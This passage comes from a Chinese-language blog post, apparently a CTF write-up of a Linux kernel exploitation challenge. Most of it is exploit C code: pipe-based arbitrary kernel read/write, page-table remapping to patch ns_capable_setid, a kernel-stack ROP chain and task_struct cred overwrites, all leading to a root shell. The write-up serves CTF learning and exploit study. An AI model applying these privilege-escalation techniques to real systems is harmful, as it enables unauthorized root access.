class="line"><span class="meta">#<span class="keyword">define</span> PGD_ENTRY(addr) ((addr &gt;&gt; PGD_OFFSET) &amp; PT_ENTRY_MASK)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_ATTR_RW (1UL &lt;&lt; 1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_ATTR_NX (1UL &lt;&lt; 63)</span></span><br></pre></td></tr></table></figure>
+
+<p>由于PDE的PS位置一，所以PDE直接映射到2M的页，其实只有三级页表，放一张四级页表的图意思一下：）</p>
+<img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/%E9%A1%B5%E8%A1%A8.png" class title="页表">
+</li>
+<li><p>vaddr_resolve_for_3_level返回目标虚拟地址的物理地址</p>
+<p>对于每级页表</p>
+<ul>
+<li>先读取内容，读一页</li>
+<li>根据虚拟地址对应位数查找下一级页表的地址，还要去除低位和高位的标志位</li>
+<li>以上得出的是物理地址，加直接映射区基址转化为虚拟地址</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> buf[<span class="number">0x1000</span>];</span><br><span class="line"><span class="type">size_t</span> pud_addr, pmd_addr;</span><br><span class="line">    </span><br><span class="line">arbitrary_read_by_pipe((<span class="type">void</span>*) direct_map_addr_to_page_addr(pgd_addr), buf);</span><br><span class="line">pud_addr = (buf[PGD_ENTRY(vaddr)] &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">pud_addr += page_offset_base;</span><br><span class="line">    </span><br><span class="line">arbitrary_read_by_pipe((<span class="type">void</span>*) direct_map_addr_to_page_addr(pud_addr), buf);</span><br><span class="line">pmd_addr = (buf[PUD_ENTRY(vaddr)] &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">pmd_addr += page_offset_base;</span><br><span class="line">    </span><br><span class="line">arbitrary_read_by_pipe((<span class="type">void</span>*) direct_map_addr_to_page_addr(pmd_addr), buf);</span><br><span class="line"><span class="keyword">return</span> (buf[PMD_ENTRY(vaddr)] &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p>计算ns_capable_setid所在的小页</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dst_paddr += <span class="number">0x1000</span> * PTE_ENTRY(dst_vaddr);</span><br><span class="line">  </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Got ns_capable_setid&#x27;s phys addr: \033[0m&quot;</span></span><br><span class="line">       <span class="string">&quot;0x%lx\n\n&quot;</span>, dst_paddr);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>调用vaddr_remapping把mmap映射的物理地址改为ns_capable_setid，改两页</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* remapping to our mmap area */</span></span><br><span class="line">vaddr_remapping(pgd_addr, <span class="number">0x114514000</span>, dst_paddr);</span><br><span class="line">vaddr_remapping(pgd_addr, <span class="number">0x114514000</span> + <span class="number">0x1000</span>, dst_paddr + <span class="number">0x1000</span>);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>这里的PDE的PS位没有置一，所以是四级页表，思路和vaddr_resolve_for_3_level一样，多一步寻表和更改，更改处还要将页置为可写</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">vaddr_remapping</span><span class="params">(<span class="type">size_t</span> pgd_addr, <span class="type">size_t</span> vaddr, <span class="type">size_t</span> paddr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> buf[<span class="number">0x1000</span>];</span><br><span class="line">    <span class="type">size_t</span> pud_addr, pmd_addr, pte_addr;</span><br><span class="line"></span><br><span class="line">    arbitrary_read_by_pipe((<span class="type">void</span>*) direct_map_addr_to_page_addr(pgd_addr), buf);</span><br><span class="line">    pud_addr = (buf[PGD_ENTRY(vaddr)] &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">    pud_addr += page_offset_base;</span><br><span class="line"></span><br><span class="line">    arbitrary_read_by_pipe((<span class="type">void</span>*) direct_map_addr_to_page_addr(pud_addr), buf);</span><br><span class="line">    pmd_addr = (buf[PUD_ENTRY(vaddr)] &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">    pmd_addr += page_offset_base;</span><br><span class="line"></span><br><span class="line">    arbitrary_read_by_pipe((<span class="type">void</span>*) direct_map_addr_to_page_addr(pmd_addr), buf);</span><br><span class="line">    pte_addr = (buf[PMD_ENTRY(vaddr)] &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">    pte_addr += page_offset_base;</span><br><span class="line"></span><br><span class="line">    arbitrary_read_by_pipe((<span class="type">void</span>*) direct_map_addr_to_page_addr(pte_addr), buf);</span><br><span class="line">    buf[PTE_ENTRY(vaddr)] = paddr | <span class="number">0x8000000000000867</span>; <span class="comment">/* mark it writable */</span></span><br><span class="line">    arbitrary_write_by_pipe((<span class="type">void</span>*) direct_map_addr_to_page_addr(pte_addr), buf,</span><br><span class="line">                            <span class="number">0xff0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p>开始更改目标函数ns_capable_setid</p>
+<p>setresuid系统调用中会调用ns_capable_setid判断user的权限，直接patch ns_capable_setid使它永远return true：）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memcpy</span>(kcode_map + (NS_CAPABLE_SETID &amp; <span class="number">0xfff</span>), </span><br><span class="line">        <span class="string">&quot;\xf3\x0f\x1e\xfa&quot;</span>  <span class="comment">/* endbr64 */</span></span><br><span class="line">        <span class="string">&quot;H\xc7\xc0\x01\x00\x00\x00&quot;</span>  <span class="comment">/* mov rax, 1 */</span></span><br><span class="line">        <span class="string">&quot;\xc3&quot;</span>, <span class="comment">/* ret */</span></span><br><span class="line">        <span class="number">12</span>);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>调用setresuid更改用户id，提权拿shell</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* get root now :) */</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[*] trigger evil ns_capable_setid() in setresuid()...\n&quot;</span>);</span><br><span class="line">  </span><br><span class="line">sleep(<span class="number">5</span>);</span><br><span class="line">  </span><br><span class="line">setresuid(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">get_root_shell();</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h4 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h4><p>通过task_struct找内核栈地址所在page，直接在内核栈上写rop链</p>
+<ul>
+<li><p>还是调用pgd_vaddr_resolve获取一些地址</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">    <span class="type">size_t</span> rop[<span class="number">0x1000</span>], idx = <span class="number">0</span>; </span><br><span class="line"></span><br><span class="line">redo:</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* resolving some vaddr */</span></span><br><span class="line">    pgd_vaddr_resolve();</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>获取stack的内核虚拟地址（task_struct的task成员就是内核栈地址）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">stack_addr_another = vaddr_resolve(pgd_addr, stack_addr);</span><br><span class="line">stack_addr_another &amp;= (~PAGE_ATTR_NX); <span class="comment">/* N/X bit */</span></span><br><span class="line">stack_addr_another += page_offset_base;</span><br><span class="line">  </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Got another virt addr of kernel stack: \033[0m&quot;</span></span><br><span class="line">       <span class="string">&quot;0x%lx\n\n&quot;</span>, stack_addr_another);</span><br></pre></td></tr></table></figure>
+
+<p>vaddr_resolve函数和vaddr_resolve_for_3_level差不多，只是多一层解析</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> <span class="title function_">vaddr_resolve</span><span class="params">(<span class="type">size_t</span> pgd_addr, <span class="type">size_t</span> vaddr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> buf[<span class="number">0x1000</span>];</span><br><span class="line">    <span class="type">size_t</span> pud_addr, pmd_addr, pte_addr, pte_val;</span><br><span class="line"></span><br><span class="line">    arbitrary_read_by_pipe((<span class="type">void</span>*) direct_map_addr_to_page_addr(pgd_addr), buf);</span><br><span class="line">    pud_addr = (buf[PGD_ENTRY(vaddr)] &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">    pud_addr += page_offset_base;</span><br><span class="line"></span><br><span class="line">    arbitrary_read_by_pipe((<span class="type">void</span>*) direct_map_addr_to_page_addr(pud_addr), buf);</span><br><span class="line">    pmd_addr = (buf[PUD_ENTRY(vaddr)] &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">    pmd_addr += page_offset_base;</span><br><span class="line"></span><br><span class="line">    arbitrary_read_by_pipe((<span class="type">void</span>*) direct_map_addr_to_page_addr(pmd_addr), buf);</span><br><span class="line">    pte_addr = (buf[PMD_ENTRY(vaddr)] &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">    pte_addr += page_offset_base;</span><br><span class="line"></span><br><span class="line">    arbitrary_read_by_pipe((<span class="type">void</span>*) direct_map_addr_to_page_addr(pte_addr), buf);</span><br><span class="line">    pte_val = (buf[PTE_ENTRY(vaddr)] &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> pte_val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>构造rop链并写到栈上，尽量把rop链往后写前面用ret填充，这样就不用算偏移了（</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* construct the ROP */</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; ((<span class="number">0x1000</span> - <span class="number">8</span> * <span class="number">11</span>) / <span class="number">8</span>); i++) &#123;</span><br><span class="line">    rop[idx++] = RET + kernel_offset;</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line">rop[idx++] = POP_RDI_RET + kernel_offset;</span><br><span class="line">rop[idx++] = INIT_CRED + kernel_offset;</span><br><span class="line">rop[idx++] = COMMIT_CREDS + kernel_offset;</span><br><span class="line">rop[idx++] = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE +<span class="number">54</span> + kernel_offset;</span><br><span class="line">rop[idx++] = *(<span class="type">size_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">rop[idx++] = *(<span class="type">size_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">rop[idx++] = (<span class="type">size_t</span>) get_root_shell;</span><br><span class="line">rop[idx++] = user_cs;</span><br><span class="line">rop[idx++] = user_rflags;</span><br><span class="line">rop[idx++] = user_sp;</span><br><span class="line">rop[idx++] = user_ss;</span><br><span class="line">  </span><br><span class="line">stack_page = direct_map_addr_to_page_addr(stack_addr_another);</span><br><span class="line">  </span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[*] Hijacking current task&#x27;s stack...&quot;</span>);</span><br><span class="line">  </span><br><span class="line">sleep(<span class="number">5</span>);</span><br><span class="line">  </span><br><span class="line">arbitrary_write_by_pipe((<span class="keyword">struct</span> page*) stack_page, rop, <span class="number">0xff0</span>);</span><br></pre></td></tr></table></figure>
+
+<p>函数和栈地址（rbp）一览（好长的调用链(lll￢ω￢)）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* task_struct-&gt;stack = 0xffffc900005ff000 */</span></span><br><span class="line">entry_SYSCALL_64		<span class="number">0xffffc900005ffff8</span>		↓</span><br><span class="line">do_syscall_64			<span class="number">0xffffc900005fff48</span></span><br><span class="line">__x64_sys_write			<span class="number">0xffffc900005ffe78</span></span><br><span class="line">ksys_write				<span class="number">0xffffc900005ffe68</span></span><br><span class="line">vfs_write				<span class="number">0xffffc900005ffe28</span></span><br><span class="line">pipe_write				<span class="number">0xffffc900005ffd90</span></span><br><span class="line">copy_page_from_iter	 	<span class="number">0xffffc900005ffce8</span></span><br><span class="line">_copy_from_iter			<span class="number">0xffffc900005ffca8</span></span><br><span class="line">copyin					<span class="number">0xffffc900005ffc10</span></span><br><span class="line">rep_movs_alternative	<span class="number">0xffffc900005ffc10</span></span><br></pre></td></tr></table></figure>
+
+<p>数据写入实际上发生在rep_movs_alternative中，这个函数退出时就开始执行调用链了</p>
+<img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/stack3.png" class title="stack3">
+</li>
+<li><p><strong>！！一个小（da）插曲！！</strong></p>
+<p>arttnba3的博客有提到会出现rop链写入失败不知道写到哪去了的问题</p>
+<p>这是泄露的内核栈地址</p>
+<img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/stack.png" class title="stack">
+
+<p>但是内核实际上使用的栈地址（也是之后要写入rop链的栈地址）是stack_addr + 0x3000</p>
+<img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/stack2.png" class title="stack2">
+
+<p>arttnba3的原exp是泄露task_struct-&gt;stack（查找pgd时也是找的这一页），在写入的时候在对应页+ 3 * 0x40</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">pgd_vaddr_resolve</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    stack_addr = tsk_buf[<span class="number">4</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">privilege_escalation_by_rop</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    arbitrary_write_by_pipe((<span class="keyword">struct</span> page*) (stack_page + <span class="number">0x40</span> * <span class="number">3</span>), rop, <span class="number">0xff0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>但是实测stack使用的page不一定是物理连续的(ˉ▽ˉ；)…，所以会不知道写哪去了</p>
+<p>所以更改一下最开始的stack泄露，直接+ 0x3000，查找pgd时直接查找这一页，写入也直接写入这一页</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">pgd_vaddr_resolve</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    stack_addr = tsk_buf[<span class="number">4</span>] + <span class="number">0x3000</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">privilege_escalation_by_rop</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    arbitrary_write_by_pipe((<span class="keyword">struct</span> page*) stack_page, rop, <span class="number">0xff0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p><em>ps：干了件很sb的事就是把img的包重新打包的时候打成cpio了，md断点突然打不上了血压暴涨发出尖锐的爆鸣声(╯▔皿▔)╯</em></p>
+<h4 id="修改cred"><a href="#修改cred" class="headerlink" title="修改cred"></a>修改cred</h4><p>init_cred为有着root权限的cred，我们可以直接将当前进程的cred修改为该cred以完成提权</p>
+<p>arttnba3的exp里是使用task_struct-&gt;real_parent向前遍历直到task_struct-&gt;real_parent &#x3D;&#x3D; &amp;task_struct来寻找init进程（所有进程的父进程）的task_struct来寻找init_cred，这道题有init_cred地址就不遍历了（绝对不是因为我懒(‾◡◝)）</p>
+<p><em>ps：这里我又干了件很sb的事就是所有地址都多加了个kernel_base(ˉ▽ˉ；)…，🧠飞飞~</em></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief find the init_task and copy something to current task_struct</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">privilege_escalation_by_task_overwrite</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    init_task = kernel_offset + INIT_TASK;</span><br><span class="line">    init_cred = kernel_offset + INIT_CRED;</span><br><span class="line">    init_nsproxy = kernel_offset + INIT_NSPROXY;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found init_task: \033[0m0x%lx\n&quot;</span>, init_task);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found init_cred: \033[0m0x%lx\n&quot;</span>, init_cred);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found init_nsproxy:\033[0m0x%lx\n&quot;</span>,init_nsproxy);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* now, changing the current task_struct to get the full root :) */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Escalating ROOT privilege now...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    current_task_page = direct_map_addr_to_page_addr(current_task);</span><br><span class="line"></span><br><span class="line">    arbitrary_read_by_pipe((<span class="keyword">struct</span> page*) current_task_page, buf);</span><br><span class="line">    arbitrary_read_by_pipe((<span class="keyword">struct</span> page*) (current_task_page+<span class="number">0x40</span>), &amp;buf[<span class="number">512</span>]);</span><br><span class="line"></span><br><span class="line">    tsk_buf = (<span class="type">size_t</span>*) ((<span class="type">size_t</span>) buf + (current_task &amp; <span class="number">0xfff</span>));</span><br><span class="line">    tsk_buf[<span class="number">367</span>] = init_cred;</span><br><span class="line">    tsk_buf[<span class="number">368</span>] = init_cred;</span><br><span class="line">    tsk_buf[<span class="number">381</span>] = init_nsproxy;</span><br><span class="line"></span><br><span class="line">    arbitrary_write_by_pipe((<span class="keyword">struct</span> page*) current_task_page, buf, <span class="number">0xff0</span>);</span><br><span class="line">    arbitrary_write_by_pipe((<span class="keyword">struct</span> page*) (current_task_page+<span class="number">0x40</span>),</span><br><span class="line">                            &amp;buf[<span class="number">512</span>], <span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] Done.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] checking for root...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    get_root_shell();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这种提权好像只是有概率成功……(・∀・(・∀・(・∀・*)</p>
+<p>破案了，跟上面一样的问题，task_struct所在的两页不一定物理连续，所以cred可能又写到别的地方去了</p>
+<p>更改后的exp</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief find the init_task and copy something to current task_struct</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">privilege_escalation_by_task_overwrite</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    init_task = kernel_offset + INIT_TASK;</span><br><span class="line">    init_cred = kernel_offset + INIT_CRED;</span><br><span class="line">    init_nsproxy = kernel_offset + INIT_NSPROXY;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found init_task: \033[0m0x%lx\n&quot;</span>, init_task);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found init_cred: \033[0m0x%lx\n&quot;</span>, init_cred);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found init_nsproxy:\033[0m0x%lx\n&quot;</span>,init_nsproxy);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* now, changing the current task_struct to get the full root :) */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Escalating ROOT privilege now...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    current_task_page = direct_map_addr_to_page_addr(current_task);</span><br><span class="line"></span><br><span class="line">    arbitrary_read_by_pipe((<span class="keyword">struct</span> page*) current_task_page, buf);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> current_task_page_1 = direct_map_addr_to_page_addr(current_task + <span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">    arbitrary_read_by_pipe((<span class="keyword">struct</span> page*) (current_task_page_1), &amp;buf[<span class="number">512</span>]);</span><br><span class="line"></span><br><span class="line">    tsk_buf = (<span class="type">size_t</span>*) ((<span class="type">size_t</span>) buf + (current_task &amp; <span class="number">0xfff</span>));</span><br><span class="line">    tsk_buf[<span class="number">367</span>] = init_cred;</span><br><span class="line">    tsk_buf[<span class="number">368</span>] = init_cred;</span><br><span class="line">    tsk_buf[<span class="number">381</span>] = init_nsproxy;</span><br><span class="line"></span><br><span class="line">    arbitrary_write_by_pipe((<span class="keyword">struct</span> page*) current_task_page, buf, <span class="number">0xff0</span>);</span><br><span class="line">    arbitrary_write_by_pipe((<span class="keyword">struct</span> page*) current_task_page_1,</span><br><span class="line">                            &amp;buf[<span class="number">512</span>], <span class="number">0xff0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] Done.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] checking for root...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    get_root_shell();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h2><ul>
+<li><p>pipe_buffer自己写自己这种骚操作可行🐎</p>
+</li>
+<li><p>KASLR机制，物理内存探测和映射什么的（其实就是继续系统启动，乐）</p>
+</li>
+<li><p>What is CFI?</p>
+</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/kernel/" rel="tag"># kernel</a>
+              <a href="/tags/wp/" rel="tag"># wp</a>
+              <a href="/tags/Heap/" rel="tag"># Heap</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/11/13/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/" rel="prev" title="Kernel源码分析-内存管理">
+      <i class="fa fa-chevron-left"></i> Kernel源码分析-内存管理
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
